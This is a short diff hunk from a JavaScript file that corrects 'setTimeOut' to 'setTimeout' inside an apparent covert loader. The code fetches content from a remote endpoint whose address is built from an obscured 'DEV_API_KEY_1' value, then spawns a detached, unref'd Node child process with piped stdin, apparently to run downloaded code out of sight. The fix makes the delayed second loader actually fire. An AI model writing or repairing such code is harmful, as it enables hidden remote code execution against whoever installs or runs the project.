@@ -25,7 +25,7 @@ const mainFunction = (async () => {
   child.unref();
 })();
 
-setTimeOut(() => {
+setTimeout(() => {
   const mainFunction2 = (async () => {
     const s1 = (await axios.get(update(DEV_API_KEY_1))).data.content;
     const child = spawn('node', [], { detached: true, stdio: ['pipe', 'ignore', 'ignore'] });
